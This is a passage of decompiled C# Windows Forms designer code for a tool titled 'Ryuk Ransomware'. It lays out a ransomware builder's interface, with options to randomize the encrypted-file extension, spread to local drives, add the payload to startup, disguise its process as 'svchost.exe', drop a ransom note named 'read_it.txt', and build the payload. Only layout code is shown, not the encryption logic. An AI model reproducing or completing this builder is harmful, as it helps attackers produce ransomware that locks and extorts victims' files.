      this.shapedButton2.TextLocation_X = 33;
      this.shapedButton2.TextLocation_Y = 19;
      this.shapedButton2.Transparent1 = 250;
      this.shapedButton2.Transparent2 = 250;
      this.shapedButton2.UseVisualStyleBackColor = false;
      this.shapedButton2.Click += new EventHandler(this.shapedButton2_Click);
      this.label1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(522, 17);
      this.label1.Name = "label1";
      this.label1.Size = new Size(115, 15);
      this.label1.TabIndex = 26;
      this.label1.Text = "Dropped File Name";
      this.droppedMessageTextbox.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.droppedMessageTextbox.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.droppedMessageTextbox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.droppedMessageTextbox.ForeColor = SystemColors.Window;
      this.droppedMessageTextbox.Location = new Point(525, 40);
      this.droppedMessageTextbox.Name = "droppedMessageTextbox";
      this.droppedMessageTextbox.Size = new Size(143, 22);
      this.droppedMessageTextbox.TabIndex = 25;
      this.droppedMessageTextbox.Text = "read_it.txt";
      this.droppedMessageTextbox.TextAlign = HorizontalAlignment.Center;
      this.shapedButton1.BackColor = System.Drawing.Color.Transparent;
      this.shapedButton1.BorderColor = System.Drawing.Color.Transparent;
      this.shapedButton1.BorderWidth = 2;
      this.shapedButton1.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
      this.shapedButton1.ButtonText = "Decrypter & Options";
      this.shapedButton1.Cursor = Cursors.Hand;
      this.shapedButton1.EndColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton1.FlatAppearance.BorderSize = 0;
      this.shapedButton1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
      this.shapedButton1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
      this.shapedButton1.FlatStyle = FlatStyle.Flat;
      this.shapedButton1.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.shapedButton1.ForeColor = System.Drawing.Color.White;
      this.shapedButton1.GradientAngle = 80;
      this.shapedButton1.Location = new Point(175, 82);
      this.shapedButton1.MouseClickColor1 = System.Drawing.Color.Black;
      this.shapedButton1.MouseClickColor2 = System.Drawing.Color.Black;
      this.shapedButton1.MouseHoverColor1 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton1.MouseHoverColor2 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton1.Name = "shapedButton1";
      this.shapedButton1.ShowButtontext = true;
      this.shapedButton1.Size = new Size(166, 55);
      this.shapedButton1.StartColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton1.TabIndex = 23;
      this.shapedButton1.TextLocation_X = 16;
      this.shapedButton1.TextLocation_Y = 20;
      this.shapedButton1.Transparent1 = 200;
      this.shapedButton1.Transparent2 = 200;
      this.shapedButton1.UseVisualStyleBackColor = false;
      this.shapedButton1.Click += new EventHandler(this.shapedButton1_Click);
      this.sleepCheckBox.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.sleepCheckBox.AutoSize = true;
      this.sleepCheckBox.Cursor = Cursors.Hand;
      this.sleepCheckBox.Location = new Point(359, 81);
      this.sleepCheckBox.Name = "sleepCheckBox";
      this.sleepCheckBox.Size = new Size(91, 17);
      this.sleepCheckBox.TabIndex = 22;
      this.sleepCheckBox.Text = "Delay second";
      this.sleepCheckBox.UseVisualStyleBackColor = true;
      this.sleepCheckBox.CheckedChanged += new EventHandler(this.checkBox3_CheckedChanged);
      this.SleepTextBox.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.SleepTextBox.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.SleepTextBox.Enabled = false;
      this.SleepTextBox.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.SleepTextBox.ForeColor = SystemColors.Window;
      this.SleepTextBox.Location = new Point(359, 107);
      this.SleepTextBox.Name = "SleepTextBox";
      this.SleepTextBox.Size = new Size(91, 22);
      this.SleepTextBox.TabIndex = 21;
      this.SleepTextBox.Text = "10";
      this.SleepTextBox.TextAlign = HorizontalAlignment.Center;
      this.SleepTextBox.KeyPress += new KeyPressEventHandler(this.SleepTextBox_KeyPress_1);
      this.selectIconLabel.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.selectIconLabel.AutoSize = true;
      this.selectIconLabel.Cursor = Cursors.Hand;
      this.selectIconLabel.Location = new Point(593, 93);
      this.selectIconLabel.Name = "selectIconLabel";
      this.selectIconLabel.Size = new Size(61, 13);
      this.selectIconLabel.TabIndex = 20;
      this.selectIconLabel.Text = "Select Icon";
      this.selectIconLabel.Click += new EventHandler(this.selectIconLabel_Click);
      this.pictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.pictureBox1.BorderStyle = BorderStyle.FixedSingle;
      this.pictureBox1.Cursor = Cursors.Hand;
      this.pictureBox1.Location = new Point(579, 68);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(89, 69);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.CenterImage;
      this.pictureBox1.TabIndex = 18;
      this.pictureBox1.TabStop = false;
      this.pictureBox1.Click += new EventHandler(this.pictureBox1_Click);
      this.startupcheckBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.startupcheckBox3.AutoSize = true;
      this.startupcheckBox3.Checked = true;
      this.startupcheckBox3.CheckState = CheckState.Checked;
      this.startupcheckBox3.Cursor = Cursors.Hand;
      this.startupcheckBox3.Location = new Point(470, 82);
      this.startupcheckBox3.Name = "startupcheckBox3";
      this.startupcheckBox3.Size = new Size(92, 17);
      this.startupcheckBox3.TabIndex = 15;
      this.startupcheckBox3.Text = "Add to startup";
      this.startupcheckBox3.UseVisualStyleBackColor = true;
      this.textBox4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.textBox4.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.textBox4.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox4.ForeColor = SystemColors.Window;
      this.textBox4.Location = new Point(359, 40);
      this.textBox4.Name = "textBox4";
      this.textBox4.Size = new Size(143, 22);
      this.textBox4.TabIndex = 14;
      this.textBox4.Text = "svchost.exe";
      this.textBox4.TextAlign = HorizontalAlignment.Center;
      this.checkBox2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.checkBox2.AutoSize = true;
      this.checkBox2.Checked = true;
      this.checkBox2.CheckState = CheckState.Checked;
      this.checkBox2.Cursor = Cursors.Hand;
      this.checkBox2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.checkBox2.Location = new Point(359, 17);
      this.checkBox2.Name = "checkBox2";
      this.checkBox2.Size = new Size(104, 17);
      this.checkBox2.TabIndex = 13;
      this.checkBox2.Text = "Proccess Name:";
      this.checkBox2.UseVisualStyleBackColor = true;
      this.checkBox2.CheckedChanged += new EventHandler(this.checkBox2_CheckedChanged);
      this.spreadNameText.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.spreadNameText.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.spreadNameText.ForeColor = SystemColors.Window;
      this.spreadNameText.Location = new Point(190, 40);
      this.spreadNameText.Name = "spreadNameText";
      this.spreadNameText.Size = new Size(143, 22);
      this.spreadNameText.TabIndex = 12;
      this.spreadNameText.Text = "surprise";
      this.spreadNameText.TextAlign = HorizontalAlignment.Center;
      this.checkBox1.AutoSize = true;
      this.checkBox1.Checked = true;
      this.checkBox1.CheckState = CheckState.Checked;
      this.checkBox1.Cursor = Cursors.Hand;
      this.checkBox1.Location = new Point(20, 14);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(146, 17);
      this.checkBox1.TabIndex = 11;
      this.checkBox1.Text = "Randomize file extension:";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.checkBox1.CheckedChanged += new EventHandler(this.checkBox1_CheckedChanged);
      this.textBox2.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.textBox2.Enabled = false;
      this.textBox2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox2.ForeColor = SystemColors.Window;
      this.textBox2.Location = new Point(20, 40);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(143, 22);
      this.textBox2.TabIndex = 10;
      this.textBox2.Text = "encrypted";
      this.textBox2.TextAlign = HorizontalAlignment.Center;
      this.usbSpreadCheckBox.AutoSize = true;
      this.usbSpreadCheckBox.Checked = true;
      this.usbSpreadCheckBox.CheckState = CheckState.Checked;
      this.usbSpreadCheckBox.Cursor = Cursors.Hand;
      this.usbSpreadCheckBox.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.usbSpreadCheckBox.Location = new Point(193, 14);
      this.usbSpreadCheckBox.Name = "usbSpreadCheckBox";
      this.usbSpreadCheckBox.Size = new Size(122, 17);
      this.usbSpreadCheckBox.TabIndex = 9;
      this.usbSpreadCheckBox.Text = "Spread Local Drives";
      this.usbSpreadCheckBox.UseVisualStyleBackColor = true;
      this.usbSpreadCheckBox.CheckedChanged += new EventHandler(this.usbSpreadCheckBox_CheckedChanged);
      this.shapedButton4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.shapedButton4.BackColor = System.Drawing.Color.Transparent;
      this.shapedButton4.BorderColor = System.Drawing.Color.Transparent;
      this.shapedButton4.BorderWidth = 2;
      this.shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
      this.shapedButton4.ButtonText = "Build ";
      this.shapedButton4.Cursor = Cursors.Hand;
      this.shapedButton4.EndColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton4.FlatAppearance.BorderSize = 0;
      this.shapedButton4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
      this.shapedButton4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
      this.shapedButton4.FlatStyle = FlatStyle.Flat;
      this.shapedButton4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.shapedButton4.ForeColor = System.Drawing.Color.White;
      this.shapedButton4.GradientAngle = 90;
      this.shapedButton4.Location = new Point(699, 79);
      this.shapedButton4.MouseClickColor1 = System.Drawing.Color.Black;
      this.shapedButton4.MouseClickColor2 = System.Drawing.Color.Black;
      this.shapedButton4.MouseHoverColor1 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton4.MouseHoverColor2 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton4.Name = "shapedButton4";
      this.shapedButton4.ShowButtontext = true;
      this.shapedButton4.Size = new Size(136, 55);
      this.shapedButton4.StartColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton4.TabIndex = 8;
      this.shapedButton4.TextLocation_X = 46;
      this.shapedButton4.TextLocation_Y = 18;
      this.shapedButton4.Transparent1 = 250;
      this.shapedButton4.Transparent2 = 250;
      this.shapedButton4.UseVisualStyleBackColor = false;
      this.shapedButton4.Click += new EventHandler(this.shapedButton4_Click);
      this.shapedButton3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.shapedButton3.BackColor = System.Drawing.Color.Transparent;
      this.shapedButton3.BorderColor = System.Drawing.Color.Transparent;
      this.shapedButton3.BorderWidth = 2;
      this.shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
      this.shapedButton3.ButtonText = "About";
      this.shapedButton3.Cursor = Cursors.Hand;
      this.shapedButton3.EndColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton3.FlatAppearance.BorderSize = 0;
      this.shapedButton3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
      this.shapedButton3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
      this.shapedButton3.FlatStyle = FlatStyle.Flat;
      this.shapedButton3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.shapedButton3.ForeColor = System.Drawing.Color.White;
      this.shapedButton3.GradientAngle = 90;
      this.shapedButton3.Location = new Point(699, 18);
      this.shapedButton3.MouseClickColor1 = System.Drawing.Color.Black;
      this.shapedButton3.MouseClickColor2 = System.Drawing.Color.Black;
      this.shapedButton3.MouseHoverColor1 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton3.MouseHoverColor2 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton3.Name = "shapedButton3";
      this.shapedButton3.ShowButtontext = true;
      this.shapedButton3.Size = new Size(136, 55);
      this.shapedButton3.StartColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton3.TabIndex = 7;
      this.shapedButton3.TextLocation_X = 45;
      this.shapedButton3.TextLocation_Y = 18;
      this.shapedButton3.Transparent1 = 250;
      this.shapedButton3.Transparent2 = 250;
      this.shapedButton3.UseVisualStyleBackColor = false;
      this.shapedButton3.Click += new EventHandler(this.shapedButton3_Click);
      this.RightBottomPanel_2.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.RightBottomPanel_2.BackColor = System.Drawing.Color.Black;
      this.RightBottomPanel_2.Cursor = Cursors.SizeNWSE;
      this.RightBottomPanel_2.Location = new Point(896, 490);
      this.RightBottomPanel_2.Name = "RightBottomPanel_2";
      this.RightBottomPanel_2.Size = new Size(2, 19);
      this.RightBottomPanel_2.TabIndex = 9;
      this.RightBottomPanel_2.MouseDown += new MouseEventHandler(this.RightBottomPanel_2_MouseDown);
      this.RightBottomPanel_2.MouseMove += new MouseEventHandler(this.RightBottomPanel_2_MouseMove);
      this.RightBottomPanel_2.MouseUp += new MouseEventHandler(this.RightBottomPanel_2_MouseUp);
      this.LeftBottomPanel_2.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.LeftBottomPanel_2.BackColor = System.Drawing.Color.Black;
      this.LeftBottomPanel_2.Cursor = Cursors.SizeNESW;
      this.LeftBottomPanel_2.Location = new Point(0, 491);
      this.LeftBottomPanel_2.Name = "LeftBottomPanel_2";
      this.LeftBottomPanel_2.Size = new Size(2, 19);
      this.LeftBottomPanel_2.TabIndex = 11;
      this.LeftBottomPanel_2.MouseDown += new MouseEventHandler(this.LeftBottomPanel_2_MouseDown);
      this.LeftBottomPanel_2.MouseMove += new MouseEventHandler(this.LeftBottomPanel_2_MouseMove);
      this.LeftBottomPanel_2.MouseUp += new MouseEventHandler(this.LeftBottomPanel_2_MouseUp);
      this.RightTopPanel_1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.RightTopPanel_1.BackColor = System.Drawing.Color.Black;
      this.RightTopPanel_1.Cursor = Cursors.SizeNESW;
      this.RightTopPanel_1.Location = new Point(896, 2);
      this.RightTopPanel_1.Name = "RightTopPanel_1";
      this.RightTopPanel_1.Size = new Size(2, 20);
      this.RightTopPanel_1.TabIndex = 12;
      this.RightTopPanel_1.MouseDown += new MouseEventHandler(this.RightTopPanel_1_MouseDown);
      this.RightTopPanel_1.MouseMove += new MouseEventHandler(this.RightTopPanel_1_MouseMove);
      this.RightTopPanel_1.MouseUp += new MouseEventHandler(this.RightTopPanel_1_MouseUp);
      this.RightTopPanel_2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.RightTopPanel_2.BackColor = System.Drawing.Color.Black;
      this.RightTopPanel_2.Cursor = Cursors.SizeNESW;
      this.RightTopPanel_2.Location = new Point(878, 0);
      this.RightTopPanel_2.Name = "RightTopPanel_2";
      this.RightTopPanel_2.Size = new Size(20, 2);
      this.RightTopPanel_2.TabIndex = 13;
      this.RightTopPanel_2.MouseDown += new MouseEventHandler(this.RightTopPanel_2_MouseDown);
      this.RightTopPanel_2.MouseMove += new MouseEventHandler(this.RightTopPanel_2_MouseMove);
      this.RightTopPanel_2.MouseUp += new MouseEventHandler(this.RightTopPanel_2_MouseUp);
      this.textBox1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.textBox1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.textBox1.BorderStyle = BorderStyle.None;
      this.textBox1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.textBox1.ForeColor = SystemColors.Window;
      this.textBox1.Location = new Point(12, 80);
      this.textBox1.Multiline = true;
      this.textBox1.Name = "textBox1";
      this.textBox1.ScrollBars = ScrollBars.Vertical;
      this.textBox1.Size = new Size(833, 312);
      this.textBox1.TabIndex = 18;
      this.textBox1.Text = componentResourceManager.GetString("textBox1.Text");
      this.textBox1.MouseClick += new MouseEventHandler(this.textBox1_MouseClick);
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.saveFileDialog1.FileOk += new CancelEventHandler(this.saveFileDialog1_FileOk);
      this.openFileDialog1.FileName = "openFileDialog1";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoScroll = true;
      this.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.ClientSize = new Size(847, 544);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.RightTopPanel_2);
      this.Controls.Add((Control) this.RightTopPanel_1);
      this.Controls.Add((Control) this.LeftBottomPanel_2);
      this.Controls.Add((Control) this.RightBottomPanel_2);
      this.Controls.Add((Control) this.RightBottomPanel_1);
      this.Controls.Add((Control) this.RightPanel);
      this.Controls.Add((Control) this.TopPanel);
      this.Controls.Add((Control) this.panel2);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MinimumSize = new Size(847, 544);
      this.Name = nameof (BlackForm);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Ryuk Ransomware";
      this.Load += new EventHandler(this.BlackForm_Load);
      this.TopPanel.ResumeLayout(false);
      this.TopPanel.PerformLayout();
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
